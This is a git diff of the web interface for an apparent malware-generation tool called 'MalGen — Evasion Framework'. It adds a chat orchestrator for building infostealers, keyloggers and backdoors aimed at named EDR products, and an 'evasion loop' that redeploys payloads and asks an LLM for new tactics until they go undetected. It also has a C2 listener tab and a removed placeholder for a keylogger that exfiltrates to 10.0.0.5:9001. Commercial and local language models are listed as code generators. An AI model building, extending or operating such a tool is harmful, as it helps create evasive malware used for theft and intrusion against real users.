@@ -3,20 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Malware Gen Framework</title>
+<title>MalGen — Evasion Framework</title>
 <style>
 :root {
-  --bg:     #0d1117;
-  --bg2:    #161b22;
-  --bg3:    #21262d;
-  --border: #30363d;
-  --text:   #c9d1d9;
-  --muted:  #8b949e;
-  --accent: #388bfd;
-  --green:  #3fb950;
-  --yellow: #d29922;
-  --red:    #f85149;
-  --purple: #bc8cff;
+  --bg:     #0a0e14;
+  --bg2:    #12171e;
+  --bg3:    #1a2028;
+  --border: #252d38;
+  --text:   #c8d1db;
+  --muted:  #6b7a8d;
+  --accent: #4d9cf5;
+  --green:  #34d058;
+  --yellow: #e3a820;
+  --red:    #f04848;
+  --purple: #b07dff;
   --mono: 'JetBrains Mono','Fira Code','Cascadia Code',Consolas,monospace;
   --sans: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 }
@@ -26,12 +26,13 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex
 
 /* ── Header ── */
 .hdr{
-  display:flex;align-items:center;gap:10px;padding:9px 16px;
-  background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;
+  display:flex;align-items:center;gap:12px;padding:10px 18px;
+  background:linear-gradient(135deg, #0f1319 0%, #161d27 100%);
+  border-bottom:1px solid var(--border);flex-shrink:0;
 }
-.hdr-dot{width:9px;height:9px;border-radius:50%;background:var(--red)}
-.hdr h1{font-size:13px;font-weight:600}
-.hdr-sub{font-size:12px;color:var(--muted)}
+.hdr-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px rgba(52,208,88,.4)}
+.hdr h1{font-size:14px;font-weight:700;letter-spacing:.02em;background:linear-gradient(135deg,#e0e6ed,#8ba4c0);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hdr-sub{font-size:11px;color:var(--muted);letter-spacing:.04em}
 .hdr-sp{flex:1}
 .hdr-badge{
   font-size:11px;padding:2px 9px;border-radius:10px;
@@ -52,25 +53,26 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex
 
 /* Command tabs */
 .tabs{
-  display:flex;flex-wrap:wrap;gap:2px;padding:8px 8px 0;
+  display:flex;flex-wrap:wrap;gap:3px;padding:10px 10px 0;
   border-bottom:1px solid var(--border);background:var(--bg2);
 }
 .tab{
-  padding:5px 9px;font-size:11px;font-weight:600;cursor:pointer;
-  border:1px solid transparent;border-bottom:none;border-radius:5px 5px 0 0;
-  color:var(--muted);background:transparent;transition:all .12s;
-  text-transform:uppercase;letter-spacing:.04em;
+  padding:6px 12px;font-size:11px;font-weight:600;cursor:pointer;
+  border:1px solid transparent;border-bottom:none;border-radius:6px 6px 0 0;
+  color:var(--muted);background:transparent;transition:all .15s;
+  text-transform:uppercase;letter-spacing:.05em;
 }
 .tab:hover{color:var(--text);background:var(--bg3)}
 .tab.active{color:var(--accent);border-color:var(--border);border-bottom-color:var(--bg2);background:var(--bg2)}
+.tab.primary{font-size:12px;padding:6px 14px}
 
 /* Form area */
-.form-scroll{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px}
+.form-scroll{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:8px}
 
-.sec{display:flex;flex-direction:column;gap:7px}
+.sec{display:flex;flex-direction:column;gap:7px;padding:10px;background:var(--bg3);border-radius:6px;border:1px solid var(--border)}
 .sec-hdr{
   font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;
-  letter-spacing:.08em;padding-bottom:5px;border-bottom:1px solid var(--border);
+  letter-spacing:.08em;padding-bottom:6px;border-bottom:1px solid var(--border);
 }
 
 .field{display:flex;flex-direction:column;gap:3px}
@@ -78,12 +80,12 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex
 .req{color:var(--red);font-size:10px}
 
 input[type=text],input[type=number],select,textarea{
-  background:var(--bg3);border:1px solid var(--border);color:var(--text);
-  padding:5px 8px;border-radius:5px;font-size:12px;font-family:var(--sans);
-  width:100%;outline:none;transition:border-color .12s;
+  background:var(--bg);border:1px solid var(--border);color:var(--text);
+  padding:6px 9px;border-radius:5px;font-size:12px;font-family:var(--sans);
+  width:100%;outline:none;transition:border-color .15s,box-shadow .15s;
 }
 input[type=text]:focus,input[type=number]:focus,select:focus,textarea:focus{
-  border-color:var(--accent);
+  border-color:var(--accent);box-shadow:0 0 0 2px rgba(77,156,245,.12);
 }
 textarea{resize:vertical;min-height:54px;font-family:var(--sans)}
 select option{background:var(--bg3)}
@@ -121,17 +123,17 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 .llm-btn.sel{color:var(--green);border-color:var(--green);background:rgba(63,185,80,.08)}
 
 /* Run button */
-.run-wrap{padding:10px 12px 12px;flex-shrink:0}
+.run-wrap{padding:10px 12px 14px;flex-shrink:0}
 .run-btn{
-  width:100%;padding:9px;background:var(--green);color:#0d1117;
+  width:100%;padding:10px;background:linear-gradient(135deg,#2ea043,#34d058);color:#0a0e14;
   font-size:13px;font-weight:700;border:none;border-radius:6px;cursor:pointer;
-  transition:background .12s;
+  transition:all .15s;box-shadow:0 2px 8px rgba(52,208,88,.2);
 }
-.run-btn:hover{background:#3dd68c}
-.run-btn:disabled{background:var(--bg3);color:var(--muted);cursor:not-allowed}
-.run-btn.stop{background:var(--red);color:#fff}
-.run-btn.stop:hover{background:#ff6b63}
-.run-btn.paused{background:var(--yellow);color:#0d1117}
+.run-btn:hover{background:linear-gradient(135deg,#34d058,#3dd68c);box-shadow:0 2px 12px rgba(52,208,88,.3)}
+.run-btn:disabled{background:var(--bg3);color:var(--muted);cursor:not-allowed;box-shadow:none}
+.run-btn.stop{background:linear-gradient(135deg,#d62828,#f04848);color:#fff;box-shadow:0 2px 8px rgba(240,72,72,.2)}
+.run-btn.stop:hover{background:linear-gradient(135deg,#f04848,#ff6b63)}
+.run-btn.paused{background:var(--yellow);color:#0a0e14;box-shadow:0 2px 8px rgba(227,168,32,.2)}
 .run-btn.paused:hover{background:#e5b329}
 
 /* ── Main panel ── */
@@ -158,9 +160,9 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 /* Terminal */
 .term-wrap{flex:1;overflow:hidden;position:relative;display:flex;flex-direction:column}
 .term{
-  flex:1;overflow-y:auto;padding:12px 16px;
-  font-family:var(--mono);font-size:12px;line-height:1.75;
-  background:#080d12;color:#c9d1d9;
+  flex:1;overflow-y:auto;padding:14px 18px;
+  font-family:var(--mono);font-size:12px;line-height:1.8;
+  background:#060a0f;color:#c8d1db;
 }
 .ll{white-space:pre-wrap;word-break:break-all}
 .ll.info {}
@@ -367,6 +369,100 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
   .term{font-size:10px}
   input[type=text],input[type=number],select,textarea{font-size:13px}
 }
+
+/* ── Hermes Chat ── */
+.hermes-chat{display:none;flex-direction:column;flex:1;overflow:hidden}
+.hermes-chat.active{display:flex}
+.chat-messages{
+  flex:1;overflow-y:auto;padding:12px 16px;
+  display:flex;flex-direction:column;gap:10px;
+}
+.chat-msg{
+  max-width:85%;padding:10px 14px;border-radius:12px;
+  font-size:13px;line-height:1.5;word-wrap:break-word;
+}
+.chat-msg.user{
+  align-self:flex-end;background:var(--accent);color:#fff;
+  border-bottom-right-radius:4px;
+}
+.chat-msg.hermes{
+  align-self:flex-start;background:var(--bg3);border:1px solid var(--border);
+  border-bottom-left-radius:4px;
+}
+.chat-msg.system{
+  align-self:center;background:transparent;border:1px solid var(--border);
+  color:var(--muted);font-size:11px;padding:6px 12px;border-radius:8px;
+}
+.chat-msg.tool{
+  align-self:flex-start;background:#1a1f28;border:1px solid #2a3040;
+  font-family:var(--mono);font-size:11px;color:#8ba4c0;
+  border-left:3px solid var(--purple);padding:8px 12px;max-width:92%;
+}
+.chat-msg .tool-name{color:var(--purple);font-weight:700;margin-bottom:4px}
+.chat-msg pre{white-space:pre-wrap;margin:4px 0 0;font-size:11px;color:var(--muted)}
+.chat-input-wrap{
+  display:flex;gap:8px;padding:10px 14px;
+  border-top:1px solid var(--border);background:var(--bg2);
+}
+.chat-input{
+  flex:1;background:var(--bg3);border:1px solid var(--border);
+  border-radius:8px;color:var(--text);padding:10px 14px;
+  font-size:13px;font-family:var(--sans);resize:none;
+  min-height:42px;max-height:120px;outline:none;
+}
+.chat-input:focus{border-color:var(--accent)}
+.chat-send{
+  background:var(--accent);color:#fff;border:none;border-radius:8px;
+  padding:0 18px;font-size:13px;font-weight:600;cursor:pointer;
+  white-space:nowrap;
+}
+.chat-send:hover{background:#3d8ce5}
+.chat-send:disabled{background:var(--bg3);color:var(--muted);cursor:not-allowed}
+.hermes-status{
+  display:flex;align-items:center;gap:8px;padding:8px 16px;
+  border-bottom:1px solid var(--border);background:var(--bg2);
+  font-size:11px;color:var(--muted);
+}
+.hermes-dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
+.hermes-dot.connected{background:var(--green);box-shadow:0 0 4px rgba(52,208,88,.4)}
+.hermes-dot.thinking{background:var(--yellow);animation:pulse 1s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.hermes-config{
+  display:flex;gap:8px;padding:8px 14px;
+  border-bottom:1px solid var(--border);background:var(--bg2);
+  flex-wrap:wrap;
+}
+.hermes-config select,.hermes-config input{
+  background:var(--bg3);border:1px solid var(--border);color:var(--text);
+  border-radius:4px;padding:4px 8px;font-size:11px;
+}
+.hermes-config label{font-size:11px;color:var(--muted);display:flex;align-items:center;gap:4px}
+
+/* Hermes session items (rendered in sidebar form-area) */
+.hermes-session-item{
+  display:flex;align-items:center;gap:8px;padding:10px 12px;
+  cursor:pointer;transition:background .1s;position:relative;
+  border-radius:6px;margin-bottom:2px;
+}
+.hermes-session-item:hover{background:var(--bg3)}
+.hermes-session-item.active{background:var(--bg3);border-left:2px solid var(--accent)}
+.hermes-session-item .session-dot{
+  width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0;
+}
+.hermes-session-item .session-dot.thinking{background:var(--yellow);animation:pulse 1s ease-in-out infinite}
+.hermes-session-item .session-dot.ready{background:var(--green)}
+.hermes-session-title{
+  font-size:12px;font-weight:500;color:var(--text);
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.hermes-session-meta{font-size:10px;color:var(--muted)}
+.hermes-session-del{
+  display:none;padding:2px 6px;font-size:14px;color:var(--muted);
+  background:none;border:none;cursor:pointer;border-radius:4px;
+  position:absolute;right:8px;top:50%;transform:translateY(-50%);
+}
+.hermes-session-item:hover .hermes-session-del{display:block}
+.hermes-session-del:hover{color:var(--red);background:rgba(240,72,72,.1)}
 </style>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
 <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
@@ -376,8 +472,8 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 
 <div class="hdr">
   <div class="hdr-dot"></div>
-  <h1>Malware Gen Framework</h1>
-  <span class="hdr-sub">localhost portal</span>
+  <h1>MalGen</h1>
+  <span class="hdr-sub">evasion framework</span>
   <div class="hdr-sp"></div>
   <span class="hdr-badge" id="status-badge">idle</span>
   <span class="hdr-badge" id="c2-badge" title="C2 Listener" style="cursor:pointer" onclick="document.querySelector('[data-cmd=listener]').click()">C2: off</span>
@@ -392,17 +488,14 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
       <span class="arrow">&#9650;</span>
     </div>
     <div class="tabs" id="tabs">
-      <button class="tab active" data-cmd="run">run</button>
-      <button class="tab" data-cmd="generate">generate</button>
+      <button class="tab primary active" data-cmd="hermes" style="color:var(--purple);border-color:var(--purple)">&#9672; hermes</button>
+      <button class="tab" data-cmd="build">build</button>
       <button class="tab" data-cmd="vm">vm</button>
-      <button class="tab" data-cmd="verify">verify</button>
-      <button class="tab" data-cmd="analyze">analyze</button>
-      <button class="tab" data-cmd="clean">clean</button>
+      <button class="tab" data-cmd="edr">edr</button>
       <button class="tab" data-cmd="ssh">ssh</button>
       <button class="tab" data-cmd="listener">c2</button>
-      <button class="tab" data-cmd="spec">spec</button>
-      <button class="tab" data-cmd="chunk">chunk</button>
-      <button class="tab" data-cmd="edr">edr</button>
+      <button class="tab" data-cmd="verify">verify</button>
+      <button class="tab" data-cmd="clean">clean</button>
     </div>
     <div class="form-scroll" id="form-area"></div>
     <div class="run-wrap" style="display:flex;gap:6px">
@@ -414,6 +507,50 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
   <!-- ── Main panel ── -->
   <div class="main">
 
+    <!-- Hermes Chat Panel -->
+    <div class="hermes-chat" id="hermes-chat">
+      <div class="hermes-status" id="hermes-status">
+        <span class="hermes-dot" id="hermes-dot"></span>
+        <span id="hermes-status-text">Hermes — disconnected</span>
+        <div style="flex:1"></div>
+        <span id="hermes-round" style="font-family:var(--mono)"></span>
+        <button id="hermes-stop-btn" style="display:none;padding:2px 10px;font-size:11px;background:var(--red);color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600">&#9632; Stop</button>
+      </div>
+      <div class="hermes-config" id="hermes-config">
+        <label>EDR:
+          <select id="hermes-edr">
+            <option value="crowdstrike">CrowdStrike</option>
+            <option value="defender">Defender</option>
+            <option value="elastic">Elastic</option>
+            <option value="none">None</option>
+          </select>
+        </label>
+        <label>Type:
+          <select id="hermes-type">
+            <option value="infostealer">Infostealer</option>
+            <option value="keylogger">Keylogger</option>
+            <option value="backdoor">Backdoor</option>
+          </select>
+        </label>
+        <label>Format:
+          <select id="hermes-format">
+            <option value="auto">Auto</option>
+            <option value="jscript">JScript</option>
+            <option value="pe">PE (.exe)</option>
+            <option value="vbscript">VBScript</option>
+            <option value="batch">Batch</option>
+          </select>
+        </label>
+      </div>
+      <div class="chat-messages" id="chat-messages">
+        <div class="chat-msg system">Hermes orchestrator ready. Select or create a session to begin.</div>
+      </div>
+      <div class="chat-input-wrap">
+        <textarea class="chat-input" id="chat-input" placeholder="Talk to Hermes..." rows="1"></textarea>
+        <button class="chat-send" id="chat-send">Send</button>
+      </div>
+    </div>
+
     <!-- Jobs bar -->
     <div class="jobs-bar" id="jobs-bar">
       <span class="jobs-lbl">Jobs</span>
@@ -421,11 +558,11 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
     </div>
 
     <!-- Terminal -->
-    <div class="term-wrap">
+    <div class="term-wrap" id="term-wrap">
       <div class="ssh-status" id="ssh-status">SSH — disconnected</div>
       <div class="term" id="term">
         <div class="term-hint" id="term-hint">
-          Configure a command on the left and press Run<br>
+          Select a recipe and press Build to start<br>
           <span class="cursor"></span>
         </div>
       </div>
@@ -460,83 +597,10 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 <script>
 // ── Field definitions ────────────────────────────────────────────────────────
 const CMDS = {
-  run: [
-    {s:'Target', f:[
-      {id:'spec',         lbl:'Spec file',     type:'text', req:1, ph:'spec.yaml or /full/path/target.yaml'},
-      {id:'malware_type', lbl:'Malware type',  type:'text', req:1, ph:'keylogger · ransomware · backdoor · info stealer…'},
-      {id:'behavior',     lbl:'Behavior spec', type:'area', ph:'(optional) keylogger that sends to 10.0.0.5:9001 over AES-256 TCP, persists via HKCU Run key…'},
-      {id:'output',       lbl:'Output dir',    type:'text', ph:'./results'},
-    ]},
-    {s:'Output', f:[
-      {id:'source_language', lbl:'Language', type:'sel', opts:['c','go','best'], def:'c'},
-      {id:'output_format',   lbl:'Format',   type:'sel', opts:['exe','dll','shellcode'], def:'exe'},
-    ]},
-    {s:'Mode', f:[{id:'mode', type:'mode'}]},
-    {s:'Cloud', f:[
-      {id:'cloud_provider', lbl:'Provider', type:'sel',
-        opts:['fugu','openrouter'], def:'fugu'},
-      {id:'cloud_model', lbl:'Model override', type:'text',
-        ph:'openrouter: deepseek/deepseek-r1-0528, anthropic/claude-sonnet-4-5…'},
-    ]},
-    {s:'Local LLM', f:[
-      {id:'llm_url',   type:'llm_endpoint'},
-      {id:'llm_model', lbl:'Model name', type:'text', ph:'qwen3-35b-a3b… (blank = use loaded model)'},
-    ]},
-    {s:'Planning', f:[
-      {id:'plan_review_cycles', lbl:'Review cycles', type:'num', ph:'10', def:'10'},
-      {id:'plan_review_infinite', lbl:'Infinite (loop until approved)', type:'chk'},
-    ]},
-    {s:'Loop', f:[
-      {id:'loop',      lbl:'Enable retry loop',                    type:'chk'},
-      {id:'exhaustive',lbl:'Exhaustive (try all techniques)',      type:'chk'},
-      {id:'max_iters', lbl:'Max iterations',  type:'num', ph:'5', def:'5'},
-      {id:'min_iters', lbl:'Min iterations',  type:'num', ph:'1', def:'1'},
-    ]},
-    {s:'VM', f:[
-      {id:'boot_existing',  lbl:'Boot existing VM disk (--boot-existing)',   type:'chk'},
-      {id:'use_existing_vm',lbl:'Use already-running VM (--use-existing-vm)',type:'chk'},
-      {id:'os', lbl:'OS (--boot-existing)', type:'sel',
-        opts:['windows-11','windows-10','ubuntu-24.04','ubuntu-22.04'], def:'windows-11'},
-      {id:'vm_port', lbl:'SSH port',     type:'num', ph:'10022', def:'10022'},
-      {id:'vm_user', lbl:'SSH username', type:'text', ph:'vmuser'},
-      {id:'vm_pass', lbl:'SSH password', type:'text', ph:'vmuser123'},
-    ]},
-    {s:'Flags', f:[
-      {id:'verbose', lbl:'Verbose logging',       type:'chk'},
-      {id:'debug',   lbl:'Debug mode (step trace)',type:'chk'},
-    ]},
-  ],
-  generate: [
-    {s:'Target', f:[
-      {id:'spec',         lbl:'Spec file',    type:'text', req:1, ph:'spec.yaml'},
-      {id:'malware_type', lbl:'Malware type', type:'text', req:1, ph:'keylogger · ransomware · backdoor…'},
-      {id:'behavior',     lbl:'Behavior spec',type:'area', ph:'(optional) detailed behavioral requirements'},
-      {id:'output',       lbl:'Output dir',   type:'text', ph:'./results'},
-    ]},
-    {s:'Output', f:[
-      {id:'source_language', lbl:'Language', type:'sel', opts:['c','go','best'], def:'c'},
-      {id:'output_format',   lbl:'Format',   type:'sel', opts:['exe','dll','shellcode'], def:'exe'},
-    ]},
-    {s:'Mode', f:[{id:'mode', type:'mode'}]},
-    {s:'Cloud', f:[
-      {id:'cloud_provider', lbl:'Provider', type:'sel',
-        opts:['fugu','openrouter'], def:'fugu'},
-      {id:'cloud_model', lbl:'Model override', type:'text',
-        ph:'openrouter: deepseek/deepseek-r1-0528, anthropic/claude-sonnet-4-5…'},
-    ]},
-    {s:'Local LLM', f:[
-      {id:'llm_url',   type:'llm_endpoint'},
-      {id:'llm_model', lbl:'Model name', type:'text', ph:'qwen3-35b-a3b… (blank = use loaded model)'},
-    ]},
-    {s:'Planning', f:[
-      {id:'plan_review_cycles', lbl:'Review cycles', type:'num', ph:'10', def:'10'},
-      {id:'plan_review_infinite', lbl:'Infinite (loop until approved)', type:'chk'},
-    ]},
-    {s:'Flags', f:[
-      {id:'verbose', lbl:'Verbose logging',        type:'chk'},
-      {id:'debug',   lbl:'Debug mode (step trace)', type:'chk'},
-    ]},
-  ],
+  build: {
+    label: 'build',
+    build: (sec) => { buildChunkForm(sec); }
+  },
   vm: {
     label: 'vm',
     build: (sec) => { buildVmForm(sec); }
@@ -575,16 +639,6 @@ const CMDS = {
       {id:'debug',   lbl:'Debug mode (step trace)', type:'chk'},
     ]},
   ],
-  analyze: [
-    {s:'Target', f:[
-      {id:'spec',         lbl:'Spec file',          type:'text', req:1, ph:'spec.yaml'},
-      {id:'malware_type', lbl:'Malware type',        type:'text', ph:'keylogger'},
-      {id:'behavior',     lbl:'Behavior spec',       type:'area', ph:'(optional)'},
-      {id:'db_n',         lbl:'DB results per query',type:'num', ph:'10', def:'10'},
-    ]},
-    {s:'Mode', f:[{id:'mode', type:'mode'}]},
-    {s:'Flags', f:[{id:'verbose', lbl:'Verbose logging', type:'chk'}]},
-  ],
   clean: [
     {s:'Options', f:[
       {id:'clean_all', lbl:'Remove everything including base images (--all)', type:'chk'},
@@ -606,38 +660,6 @@ const CMDS = {
       {id:'c2_status_display', type:'c2_status'},
     ]},
   ],
-  spec: {
-    label: 'spec.yaml',
-    build: (sec) => {
-      sec.innerHTML = `
-        <div class="sec">
-          <div class="sec-hdr" style="display:flex;align-items:center;justify-content:space-between">
-            <span>spec.yaml</span>
-            <span style="display:flex;align-items:center;gap:8px">
-              <span id="spec-status" style="font-size:11px"></span>
-              <button id="spec-save-btn" style="padding:3px 12px;font-size:11px;font-weight:600;cursor:pointer;border:1px solid var(--border);border-radius:4px;color:var(--green);background:var(--bg3)" onclick="saveSpec()">Save</button>
-            </span>
-          </div>
-          <textarea id="spec-editor" rows="30" spellcheck="false" style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:5px;padding:8px;tab-size:2;resize:vertical;line-height:1.65;outline:none"></textarea>
-        </div>
-      `;
-      // Tab key support for indentation
-      document.getElementById('spec-editor').addEventListener('keydown', function(e) {
-        if (e.key === 'Tab') {
-          e.preventDefault();
-          const start = this.selectionStart;
-          const end = this.selectionEnd;
-          this.value = this.value.substring(0, start) + '  ' + this.value.substring(end);
-          this.selectionStart = this.selectionEnd = start + 2;
-        }
-      });
-      loadSpec();
-    }
-  },
-  chunk: {
-    label: 'chunk',
-    build: (sec) => { buildChunkForm(sec); }
-  },
   edr: {
     label: 'edr',
     build: (sec) => { buildEdrForm(sec); }
@@ -645,7 +667,7 @@ const CMDS = {
 };
 
 // ── State ────────────────────────────────────────────────────────────────────
-let activeCmd = 'run';
+let activeCmd = 'build';
 let activeJobId = null;
 let activeJobCmd = null;  // which tab started the running job
 let activeJobPaused = false;
@@ -770,10 +792,12 @@ function saveFormState(cmd, data) {
 
 function restoreFormState(cmd) {
   try {
+    const entry = CMDS[cmd];
+    if (!entry || entry.build) return;
     const raw = localStorage.getItem('mgf_state_' + cmd);
     if (!raw) { if (cmd !== 'ssh') pickMode('local-run'); return; }
     const saved = JSON.parse(raw);
-    (CMDS[cmd] || []).forEach(sec => sec.f.forEach(f => {
+    (entry || []).forEach(sec => sec.f.forEach(f => {
       if (f.type === 'mode') {
         if (saved.mode) pickMode(saved.mode);
         return;
@@ -789,7 +813,7 @@ function restoreFormState(cmd) {
       else e.value = saved[f.id];
     }));
     if (saved.mode) pickMode(saved.mode);
-  } catch(e) { if (cmd !== 'ssh') pickMode('local-run'); }
+  } catch(e) {}
 }
 
 // ── Mobile sidebar toggle ────────────────────────────────────────────────────
@@ -928,6 +952,7 @@ document.getElementById('tabs').addEventListener('click', ev => {
   t.classList.add('active');
   activeCmd = t.dataset.cmd;
   updateMobileLabel();
+  if (activeCmd === 'hermes') return;
   renderForm(activeCmd);
   const btn = document.getElementById('run-btn');
   const pauseBtn = document.getElementById('pause-btn');
@@ -941,15 +966,12 @@ document.getElementById('tabs').addEventListener('click', ev => {
     setSshView(false);
     refreshC2Status();
     updateC2Button();
-  } else if (activeCmd === 'spec') {
-    setSshView(false);
-    btn.style.display = 'none';
-  } else if (activeCmd === 'chunk') {
+  } else if (activeCmd === 'build') {
     setSshView(false);
     btn.textContent = '▶︎  Build';
     btn.classList.remove('stop','paused');
     btn.disabled = false;
-    if (activeJobId && activeJobCmd === 'chunk') {
+    if (activeJobId && activeJobCmd === 'build') {
       setRunning(true, activeJobPaused);
     }
   } else if (activeCmd === 'vm') {
@@ -962,7 +984,6 @@ document.getElementById('tabs').addEventListener('click', ev => {
     refreshEdrScores();
   } else {
     setSshView(false);
-    // Show stop/pause only if THIS tab owns the running job
     if (activeJobId && activeJobCmd === activeCmd) {
       setRunning(true, activeJobPaused);
     } else {
@@ -970,7 +991,6 @@ document.getElementById('tabs').addEventListener('click', ev => {
       btn.classList.remove('stop','paused');
       btn.disabled = false;
     }
-    pickMode(getMode());
   }
 });
 
@@ -991,7 +1011,7 @@ document.getElementById('run-btn').addEventListener('click', async () => {
   }
 
   // Chunk tab: build or stop
-  if (activeCmd === 'chunk') {
+  if (activeCmd === 'build') {
     if (btn.classList.contains('stop') && activeJobId) {
       await fetch(`/api/jobs/${activeJobId}/kill`, {method:'POST'});
       appendLog('');
@@ -1017,34 +1037,11 @@ document.getElementById('run-btn').addEventListener('click', async () => {
   }
 
   const d = formData();
-  if (['run','generate','verify','analyze'].includes(d.command) && !d.spec) {
+  if (['verify'].includes(d.command) && !d.spec) {
     flashError('Spec file is required.'); return;
-  }
-  if (['run','generate'].includes(d.command) && !d.malware_type) {
-    flashError('Malware type is required.'); return;
   }
 
   saveFormState(activeCmd, d);
-
-  // Write form values to spec.yaml before running
-  if (['run', 'generate'].includes(d.command)) {
-    try {
-      await fetch('/api/spec/merge', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          malware_type: d.malware_type || '',
-          behavior: d.behavior || '',
-          source_language: d.source_language || 'c',
-          output_format: d.output_format || 'exe',
-          os: d.os || 'windows-11',
-        }),
-      });
-    } catch(e) {
-      flashError(`Could not update spec.yaml: ${e}`);
-      return;
-    }
-  }
 
   try {
     const r = await fetch('/api/jobs', {
@@ -1212,7 +1209,7 @@ function setRunning(on, paused) {
       pauseBtn.style.color = '';
     }
   } else {
-    btn.textContent = activeCmd === 'chunk' ? '▶︎  Build' : activeCmd === 'edr' ? '▶︎  Score' : activeCmd === 'vm' ? '▶︎  Boot' : '▶︎  Run';
+    btn.textContent = activeCmd === 'build' ? '▶︎  Build' : activeCmd === 'edr' ? '▶︎  Score' : activeCmd === 'vm' ? '▶︎  Boot' : activeCmd === 'ssh' ? '⏎  Connect' : '▶︎  Run';
     btn.classList.remove('stop','paused');
     btn.disabled = false;
     pauseBtn.style.display = 'none';
@@ -1289,7 +1286,7 @@ async function initJobs() {
   } catch {}
 }
 
-// ── Spec editor ──────────────────────────────────────────────────────────────
+// ── Spec editor (kept for API compatibility) ────────────────────────────────
 const SPEC_TEMPLATE = `# Target environment specification
 os_platform: windows              # windows | linux
 os_version: windows-11            # windows-11 | windows-10 | ubuntu-24.04
@@ -1522,12 +1519,13 @@ function buildChunkForm(area) {
     </div>
 
     <div class="sec">
-      <div class="sec-hdr">Adaptive Loop</div>
-      <label class="chk-row"><input type="checkbox" id="chunk-adaptive"> Enable adaptive loop</label>
+      <div class="sec-hdr">Evasion Loop</div>
+      <label class="chk-row"><input type="checkbox" id="chunk-adaptive"> Enable evasion loop</label>
       <div id="chunk-adaptive-opts" style="display:none;margin-top:6px">
         <p style="font-size:11px;color:var(--muted);margin-bottom:6px">
-          Deploys, checks if detected, auto-pulls detection message,
-          picks new evasion layers, rebuilds, repeats.
+          Exam-proven algo+LLM hybrid (v6): deploy batch →
+          accumulate detections → LLM strategy analysis →
+          locked/suggested state → repeat until clean.
         </p>
         <div class="field">
           <label>Active EDRs <span style="font-size:9px;color:var(--muted);font-weight:400">(live VM state)</span></label>
@@ -1537,30 +1535,29 @@ function buildChunkForm(area) {
           <div style="display:flex;gap:4px;margin-top:6px">
             <button onclick="chunkEdrPreset('all')" class="edr-preset-btn" style="font-size:10px;padding:3px 6px">All On</button>
             <button onclick="chunkEdrPreset('defender-only')" class="edr-preset-btn" style="font-size:10px;padding:3px 6px">Defender Only</button>
+            <button onclick="chunkEdrPreset('crowdstrike-only')" class="edr-preset-btn" style="font-size:10px;padding:3px 6px">Falcon Only</button>
             <button onclick="chunkEdrPreset('none')" class="edr-preset-btn" style="font-size:10px;padding:3px 6px;border-color:var(--red);color:var(--red)">All Off</button>
           </div>
         </div>
-        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
-          <div class="field">
-            <label for="chunk-max-algo">T1: Algo</label>
-            <input type="number" id="chunk-max-algo" value="5" min="0" max="50" style="width:100%;font-family:var(--mono);font-size:11px">
+        <div style="display:flex;gap:8px">
+          <div class="field" style="flex:1">
+            <label for="chunk-max-rounds">Max rounds</label>
+            <input type="number" id="chunk-max-rounds" value="50" min="1" max="200" style="width:100%;font-family:var(--mono);font-size:11px">
           </div>
-          <div class="field">
-            <label for="chunk-max-llm">T2: Local</label>
-            <input type="number" id="chunk-max-llm" value="3" min="0" max="50" style="width:100%;font-family:var(--mono);font-size:11px">
-          </div>
-          <div class="field">
-            <label for="chunk-max-cloud">T3: Cloud</label>
-            <input type="number" id="chunk-max-cloud" value="2" min="0" max="50" style="width:100%;font-family:var(--mono);font-size:11px">
+          <div class="field" style="flex:1">
+            <label for="chunk-batch-size">Batch size <span style="font-size:9px;color:var(--muted);font-weight:400">(deploys before LLM)</span></label>
+            <input type="number" id="chunk-batch-size" value="3" min="1" max="20" style="width:100%;font-family:var(--mono);font-size:11px">
           </div>
         </div>
-        <p style="font-size:10px;color:var(--muted);margin-top:2px">Total: <span id="chunk-total-runs">10</span> attempts</p>
+        <label class="chk-row" style="margin-top:4px"><input type="checkbox" id="chunk-use-sim"> Pre-screen with simulation
+          <span style="font-size:9px;color:var(--muted);font-weight:400">(hill-climb before real deploy)</span>
+        </label>
       </div>
     </div>
 
     <div class="sec">
       <div class="sec-hdr">Local LLM</div>
-      <p style="font-size:10px;color:var(--muted);margin-bottom:4px">Used by adaptive loop (Tier 2+) and "Max" obfuscation.</p>
+      <p style="font-size:10px;color:var(--muted);margin-bottom:4px">Used by evasion loop (LLM correlation) and "Max" obfuscation.</p>
       <div class="field">
         <label>Endpoint</label>
         <div class="llm-pair">
@@ -1623,16 +1620,6 @@ function buildChunkForm(area) {
     document.getElementById('chunk-adaptive-opts').style.display = e.target.checked ? '' : 'none';
   });
   refreshChunkEdrs();
-  function updateTotalRuns() {
